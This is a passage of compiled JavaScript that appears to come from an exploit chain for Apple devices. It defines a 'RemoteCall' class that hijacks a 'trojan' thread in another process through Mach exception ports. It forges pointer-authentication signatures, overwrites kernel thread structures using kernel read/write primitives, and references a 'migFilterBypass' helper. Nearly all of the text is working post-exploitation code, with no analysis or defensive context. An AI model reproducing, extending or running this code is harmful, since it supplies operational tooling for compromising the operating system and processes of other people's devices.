    _classPrivateFieldSet(_trojanMem, this, _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallStable).call(this, 1000, "mmap", 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE, _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_READ | _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n));
    //console.log(TAG,`Newly mapped memory:${Utils.hex(this.#trojanMem)}`);

    // Memory must be written at least once (COW) to be found in vmMap.
    _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallStable).call(this, 100, "memset", _classPrivateFieldGet(_trojanMem, this), 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);
    _classPrivateFieldSet(_success, this, true);
    console.log(TAG, "Finished for now succesfully");
  }
  return _createClass(RemoteCall, [{
    key: "success",
    value: function success() {
      return _classPrivateFieldGet(_success, this);
    }
  }, {
    key: "krwCtx",
    value: function krwCtx() {
      return {
        controlFd: _classPrivateFieldGet(_krwControlFd, this),
        rwFd: _classPrivateFieldGet(_krwRwFd, this)
      };
    }
  }, {
    key: "pid",
    value: function pid() {
      return _classPrivateFieldGet(_pid, this);
    }
  }, {
    key: "call",
    value: function call(timeout, pc) {
      var x0 = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 0n;
      var x1 = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : 0n;
      var x2 = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : 0n;
      var x3 = arguments.length > 5 && arguments[5] !== undefined ? arguments[5] : 0n;
      var x4 = arguments.length > 6 && arguments[6] !== undefined ? arguments[6] : 0n;
      var x5 = arguments.length > 7 && arguments[7] !== undefined ? arguments[7] : 0n;
      var x6 = arguments.length > 8 && arguments[8] !== undefined ? arguments[8] : 0n;
      var x7 = arguments.length > 9 && arguments[9] !== undefined ? arguments[9] : 0n;
      //console.log(TAG, `call(${Utils.hex(pc)}, ${Utils.hex(x0)}, ${Utils.hex(x1)}, ${Utils.hex(x2)}, ${Utils.hex(x3)})`);
      return _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallStable).call(this, timeout, pc, x0, x1, x2, x3, x4, x5, x6, x7);
    }
  }, {
    key: "destroy",
    value: function destroy() {
      _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallStable).call(this, 100, "munmap", _classPrivateFieldGet(_trojanMem, this), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);
      if (_classPrivateFieldGet(_creatingExtraThread, this)) _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallStable).call(this, -1, "pthread_exit");else _assertClassBrand(_RemoteCall_brand, this, _restoreTrojanThread).call(this, _classPrivateFieldGet(_originalState, this));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203, _classPrivateFieldGet(_firstExceptionPort, this), 0n, 0n);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203, _classPrivateFieldGet(_secondExceptionPort, this), 0n, 0n);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_cancel", _classPrivateFieldGet(_dummyThread, this));
    }
  }, {
    key: "read",
    value: function read(src, dst, size) {
      if (!src || !dst || !size) return false;
      dst = BigInt(dst);
      src = BigInt(src);
      size = BigInt(size);

      //console.log(TAG, `read(): src=${Utils.hex(src)}, dst=${Utils.hex(dst)}, size=${size}`);
      var until = src + size;
      while (src < until) {
        size = until - src;
        var offs = src & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
        var copyCount = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(src + 1n) - src, size);
        var pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(src);
        var remotePage = _assertClassBrand(_RemoteCall_brand, this, _getShmemForPage).call(this, pageAddr);
        if (!remotePage) {
          console.log(TAG, "read() failed: unable to find remote page");
          return false;
        }

        //console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, port=${Utils.hex(remotePage.port)}`);
        libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", dst, remotePage.localAddress + offs, copyCount);
        src += copyCount;
        dst += copyCount;
      }
      return true;
    }
  }, {
    key: "write",
    value: function write(dst, src, size) {
      if (!src || !dst || !size) return false;
      dst = BigInt(dst);
      src = BigInt(src);
      size = BigInt(size);
      var until = dst + size;

      //console.log(TAG, `write(): dst=${Utils.hex(dst)}, src=${Utils.hex(src)}, size=${size}`);

      while (dst < until) {
        size = until - dst;
        var offs = dst & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
        var copyCount = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(dst + 1n) - dst, size);
        var pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(dst);
        var remotePage = _assertClassBrand(_RemoteCall_brand, this, _getShmemForPage).call(this, pageAddr);
        if (!remotePage) {
          console.log(TAG, "write() failed: unable to find remote page");
          return false;
        }

        //console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, offs=${offs}, length=${copyCount}, port=${Utils.hex(remotePage.port)}`);
        libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", remotePage.localAddress + offs, src, copyCount);
        dst += copyCount;
        src += copyCount;
      }
      return true;
    }
  }, {
    key: "writeStr",
    value: function writeStr(dst, str) {
      if (!str) return false;
      //return this.write(dst, Native.getCString(str), str.length + 1);
      var mem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("malloc", str.length + 1);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(mem, str);
      var ret = this.write(dst, mem, str.length + 1);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("free", mem);
      return ret;
    }
  }, {
    key: "read64",
    value: function read64(src) {
      if (!this.read(src, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE)) return false;
      var buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
      var view = new DataView(buff);
      return view.getBigUint64(0, true);
    }
  }, {
    key: "write64",
    value: function write64(dst, val) {
      var buff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
      var view = new DataView(buff);
      view.setBigUint64(0, val, true);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, buff);
      return this.write(dst, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
    }
  }, {
    key: "mem",
    value: function mem() {
      return _classPrivateFieldGet(_trojanMem, this);
    }
  }, {
    key: "pac",
    value: function pac(address, modifier) {
      return _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(_classPrivateFieldGet(_trojanThreadAddr, this), address, modifier);
    }
  }, {
    key: "insertRight",
    value: function insertRight(port, right) {
      //console.log(TAG, "Insert right: " + Utils.hex(port));

      var MACH_MSG_TYPE_COPY_SEND = 19;
      var msgBuff = new ArrayBuffer(24);
      var msg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](msgBuff);
      msg.msgh_id = 0x4141;
      msg.msgh_remote_port = _classPrivateFieldGet(_localPort, this);
      msg.msgh_local_port = port;
      msg.msgh_size = 24;
      msg.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, right);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
      var ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_msg_send", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem);
      if (ret != 0) {
        var errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_error_string", ret);
        errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readString(errString);
        console.log(TAG, "insertRight: error while sending message: " + errString);
        return 0;
      }

      //TODO receive in remote task
      msg.msgh_size = 0x100;
      msg.msgh_local_port = _classPrivateFieldGet(_remotePort, this);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
      this.write(_classPrivateFieldGet(_trojanMem, this), libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, 24);
      ret = _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallStable).call(this, 100, "mach_msg_receive", _classPrivateFieldGet(_trojanMem, this));
      if (ret != 0) {
        var _errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_error_string", ret);
        _errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readString(_errString);
        console.log(TAG, "insertRight: error while receiving message: " + _errString);
        return 0;
      }
      this.read(_classPrivateFieldGet(_trojanMem, this), libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
      var recvBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
      var recvMsg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](recvBuff);
      //console.log(TAG, "Recv msg id: " + Utils.hex(recvMsg.msgh_id));
      //console.log(TAG, "Recv remote port: " + Utils.hex(recvMsg.msgh_remote_port));

      ret = _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallStable).call(this, 100, "fileport_makefd", recvMsg.msgh_remote_port);
      if (ret < 0) {
        console.log(TAG, "insertRight: error with fileport_makefd");
        return 0;
      }
      //console.log(TAG, "Remote fileport_makefd: " + ret);

      return ret;
    }
  }]);
}();
function _testRWPrim() {
  console.log(TAG, "Testing RW prim");
  var arr = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
  var arrView = new DataView(arr);
  arrView.setBigUint64(0, 0x41414141n, true);
  var memBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(memBuff, arr);
  this.write(BigInt(_classPrivateFieldGet(_trojanMem, this)), memBuff, BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE));
  memBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
  this.read(BigInt(_classPrivateFieldGet(_trojanMem, this)), memBuff, BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE));
  var resBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(memBuff, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
  var resView = new DataView(resBuff);
  var result = resView.getBigUint64(0, true);
  console.log(TAG, "Got result from Buffer of:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(result)));
}
function _retryFirstThread(migFilterBypass) {
  if (migFilterBypass) migFilterBypass.pause();
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep", 1n);
  if (migFilterBypass) migFilterBypass.resume();
  return _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(_classPrivateFieldGet(_taskAddr, this));
}
function _signState(SigningThread, state, pc, lr) {
  //console.log(TAG,`state.opaque_flags:${Utils.hex(state.opaque_flags)}`);
  var diver = BigInt(state.opaque_flags) & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
  //console.log(TAG,`diver after:${Utils.hex(diver)}`);
  var discPC = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("pc"));
  var discLR = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("lr"));
  //console.log(TAG,`discPC:${Utils.hex(discPC)}`);
  //console.log(TAG,`discLR:${Utils.hex(discLR)}`);
  /* C wrapper for ptrauth utils
  discPC = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver),Utils.ptrauth_string_discriminator("pc"));
  discLR = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver), Utils.ptrauth_string_discriminator("lr"));
  console.log(TAG,`discPC after:${Utils.hex(discPC)}`);
  console.log(TAG,`discLR after:${Utils.hex(discLR)}`);
  */
  if (pc) {
    state.opaque_flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
    state.opaque_pc = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(SigningThread, pc, discPC);
  }
  if (lr) {
    state.opaque_flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR | __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
    state.opaque_lr = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(SigningThread, lr, discLR);
  }
  return state;
}
function _setExceptionPortOnThread(exceptionPort, currThread) {
  var migFilterBypass = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : null;
  var success = false;
  var thread_set_exception_ports_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("thread_set_exception_ports");
  var pthread_exit_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("pthread_exit");

  //console.log(TAG, "pc:          " + Utils.hex(thread_set_exception_ports_addr));
  //console.log(TAG, "pc signed:   " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, Utils.ptrauth_string_discriminator("pc"))));
  //console.log(TAG, "pc signed 0: " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, 0)));

  //let stackMem = Native.callSymbol("malloc", 0x8000);
  //let thread_set_exception_ports_addr = Native.dlsym("_exit");
  //let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
  //let state = new ThreadState(stateBuff);

  //let kr = Native.callSymbol("thread_create_running", 0x203, Utils.ARM_THREAD_STATE64, statePtr, Utils.ARM_THREAD_STATE64_COUNT, machThreadPtr);

  var pthreadPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np", pthreadPtr, 0, thread_set_exception_ports_addr, 0);
  var pthread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(pthreadPtr);
  //console.log(TAG, "pthread: " + Utils.hex(pthread));

  var machThread = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np", pthread));
  var machThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(machThread);
  //console.log(TAG, `machThread:${Utils.hex(machThread)} machThreadAddr:${Utils.hex(machThreadAddr)}`);

  if (migFilterBypass) migFilterBypass.monitorThreads(_classPrivateFieldGet(_selfThreadAddr, this), machThreadAddr);
  var state = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getState(machThread);
  if (!state) {
    console.log(TAG, "Unable to read thread state");
    return false;
  }

  //console.log(TAG, "thread_get_state OK");

  state.opaque_pc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(thread_set_exception_ports_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("pc"));
  state.opaque_lr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(pthread_exit_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("lr"));
  //state.opaque_sp = stackMem + 0x4000n;
  state.registers.set(0, _classPrivateFieldGet(_dummyThreadMach, this));
  state.registers.set(1, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_GUARD | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_BAD_ACCESS);
  state.registers.set(2, exceptionPort);
  state.registers.set(3, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES);
  state.registers.set(4, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64);

  //console.log(TAG, "pc: " + Utils.hex(state.opaque_pc));
  //console.log(TAG, "lr: " + Utils.hex(state.opaque_lr));
  //console.log(TAG, "sp: " + Utils.hex(state.opaque_sp));
  //console.log(TAG, "x0: " + Utils.hex(state.registers.get(0)));
  //console.log(TAG, "x1: " + Utils.hex(state.registers.get(1)));
  //console.log(TAG, "x2: " + Utils.hex(state.registers.get(2)));
  //console.log(TAG, "x3: " + Utils.hex(state.registers.get(3)));
  //console.log(TAG, "x4: " + Utils.hex(state.registers.get(4)));

  if (migFilterBypass) libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
  if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setState(machThread, machThreadAddr, state)) return false;

  //console.log(TAG, "Thread.setState() OK");

  if (migFilterBypass) libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
  _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(_classPrivateFieldGet(_dummyThreadAddr, this), _classPrivateFieldGet(_selfThreadCtid, this));
  if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].resume(machThread)) return false;

  //console.log(TAG, "Thread resume OK");

  /*
  let threadmem = Native.callSymbol("malloc",0x400);
  Native.write64(threadmem + 0x100n, this.#dummyThreadMach);
  Native.write64(threadmem + 0x108n, exceptionPort);
  Native.callSymbol("usleep",100n);
  Chain.threadSpawn(this.#exceptionThreadCFString, threadmem);
  let timeout = 10000n;
  if(largeTimeout)
  	timeout = 30000n;
  Native.callSymbol("usleep",timeout);
  let machThread = Native.read64(threadmem + 0x100n);
  Native.callSymbol("free",threadmem);
  let machThreadAddr = 0n;
  if(machThread == this.#dummyThreadMach)
  {
  	console.log(TAG,`remote thread didn't succeed, aborting`);
  	Thread.setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP
  	Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
  	// This will wake up setter
  	Native.callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, ExceptionPort , Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES, BigInt(Utils.ARM_THREAD_STATE64));
  	Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
  	return false;
  }
  else
  	machThreadAddr = Task.getPortKObject(machThread);
  */

  //Native.callSymbol("usleep",100n);
  //kr = Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
  //console.log(TAG, "thread_switch: " + kr);
  //if (!machThreadAddr)
  //{
  //	console.log(TAG,`Unable to get machThreadAddr`);
  //return false;
  //}
  //console.log(TAG, "Successfully switched to new mach thread");

  //Native.callSymbol("sleep", 2);
  //Native.callSymbol("usleep", 100000);

  //Native.callSymbol("sleep", 1);

  for (var i = 0; i < 10; i++) {
    libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 200000);
    var kstack = 0x0n;
    //let retries = 0n;
    //while (true && !kstack && retries < 100000n)
    //{
    //	//Native.callSymbol("usleep",100n);
    //	kstack = Thread.getStack(machThreadAddr);
    //	retries++;
    //}
    kstack = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getStack(machThreadAddr);
    if (!kstack) {
      console.log(TAG, "Failed to get kstack. Retry...");
      continue;
    }
    //console.log(TAG,`kstack:${Utils.hex(kstack)}`);
    // Waiting a bit longer to make sure pointer is valid
    //Native.callSymbol("usleep",10000n);
    //console.log(TAG,`Current mutex:${Utils.hex(Thread.getMutex(this.#dummyThreadAddr))}`);
    //uwrite64(threadmem + 0x100n,0x0n); // instead of free
    var kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE * 12);
    var kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(kstack + kernelSPOffset);
    if (!kernelSP) {
      console.log(TAG, "Failed to get SP. Retry...");
      continue;
    }
    //console.log(TAG,`kernelSP:${Utils.hex(kernelSP)}`);
    //Native.callSymbol("usleep",20000n);
    libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100n);
    //let data = Native.callSymbol("malloc",0x1000n);
    //console.log(TAG,`Before reading from page`);
    var dataBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].readBuff(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + 0x3000n, 0x1000);
    if (!dataBuff) {
      console.log(TAG, "Failed to read from kernel SP. Aborting...");
      break;
    }
    //console.log(TAG,`Second read finished succesfully`);
    //Native.callSymbol("usleep",100n);
    //let dataBuff = Native.read(data,0x1000);
    //Native.callSymbol("free",data);

    //let troPointer = Native.mem;
    var buffer = new ArrayBuffer(8);
    var view = new DataView(buffer);
    view.setBigUint64(0, _classPrivateFieldGet(_dummyThreadTro, this), true);
    var found = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].memmem(dataBuff, buffer);
    //console.log(TAG,`found:${Utils.hex(found)}`);
    found = BigInt(found) + 0x3000n;
    var correctTro = false;
    var val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
    libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + found + 0x18n, val, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
    val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readPtr(val);
    if (val == 0x1002) correctTro = true;else {
      console.log(TAG, "Wrong tro. Retry...");
      continue;
    }
    //console.log(TAG,`Wrong tro, skipping this thread`);
    if (found && correctTro) {
      //console.log(TAG,`Found TRO!`);
      if (_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread) == _classPrivateFieldGet(_taskAddr, this)) {
        var tro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(currThread);
        //console.log(TAG,`tro:${Utils.hex(tro)}`);
        libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write64(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + BigInt(found), tro);
        success = true;
        break;
      } else {
        console.log(TAG, "got empty tro, skip writing");
      }
    } else {
      console.log(TAG, "didnt find tro for ".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)));
    }
  }

  //console.log(TAG,`Injecting into:${Utils.hex(currThread)}`);
  // Set LCK_MTX_NEEDS_WAKEUP so that setter would be woken up by the turnstile of the lock on next use.
  _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(_classPrivateFieldGet(_dummyThreadAddr, this), 0x40000000); // LCK_MTX_NEEDS_WAKEUP

  //Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
  // This will wake up setter
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("thread_set_exception_ports", _classPrivateFieldGet(_dummyThreadMach, this), 0n, exceptionPort, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES, BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64));
  //Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
  //Native.callSymbol("usleep",40000n);
  //console.log(TAG,`After second thread switch`);
  //pthread_join(setExceptionThread, NULL);
  //mpd_js_thread_join(th);
  //free(data);
  //console.log(TAG,`Finish injecting into:${Utils.hex(currThread)}`);

  if (migFilterBypass) libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
  return success;
}
function _doRemoteCallTemp(timeout, name) {
  var x0 = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 0n;
  var x1 = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : 0n;
  var x2 = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : 0n;
  var x3 = arguments.length > 5 && arguments[5] !== undefined ? arguments[5] : 0n;
  var x4 = arguments.length > 6 && arguments[6] !== undefined ? arguments[6] : 0n;
  var x5 = arguments.length > 7 && arguments[7] !== undefined ? arguments[7] : 0n;
  var x6 = arguments.length > 8 && arguments[8] !== undefined ? arguments[8] : 0n;
  var x7 = arguments.length > 9 && arguments[9] !== undefined ? arguments[9] : 0n;
  var newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000, timeout);
  //Calculate actual pc addr
  var pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
  // First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
  var excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
  if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(_classPrivateFieldGet(_firstExceptionPort, this), excBuffer, newTimeout, false)) {
    console.log(TAG, "Don't receive first exception on original thread");
    return 0;
  }
  var excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer, Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
  var exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
  // Set the new state
  var newState = exc.threadState;
  newState.registers.set(0, x0);
  newState.registers.set(1, x1);
  newState.registers.set(2, x2);
  newState.registers.set(3, x3);
  newState.registers.set(4, x4);
  newState.registers.set(5, x5);
  newState.registers.set(6, x6);
  newState.registers.set(7, x7);
  newState = _assertClassBrand(_RemoteCall_brand, this, _signState).call(this, _classPrivateFieldGet(_trojanThreadAddr, this), newState, pcAddr, fakeLRTrojanCreator);
  _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
  exc.threadState.registers.set(0, x0);

  // Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
  if (timeout < 0) {
    console.log(TAG, "Trojan thread cleanup");
    return 0;
  }
  // Wait for the exception on LR corruption, so we can get return value of the call.
  if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(_classPrivateFieldGet(_firstExceptionPort, this), excBuffer, newTimeout, false)) {
    console.log(TAG, "Don't receive second exception on original thread");
    return 0;
  }
  excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer, Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
  exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
  var retValue = exc.threadState.registers.get(0);

  // Corrupt again PC so we can control flow for the next call.
  newState = exc.threadState;
  // Can be therotical used one previous implementation doesn't set LR
  //signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
  _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
  return retValue;
}
function _doRemoteCallStable(timeout, name) {
  var x0 = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 0n;
  var x1 = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : 0n;
  var x2 = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : 0n;
  var x3 = arguments.length > 5 && arguments[5] !== undefined ? arguments[5] : 0n;
  var x4 = arguments.length > 6 && arguments[6] !== undefined ? arguments[6] : 0n;
  var x5 = arguments.length > 7 && arguments[7] !== undefined ? arguments[7] : 0n;
  var x6 = arguments.length > 8 && arguments[8] !== undefined ? arguments[8] : 0n;
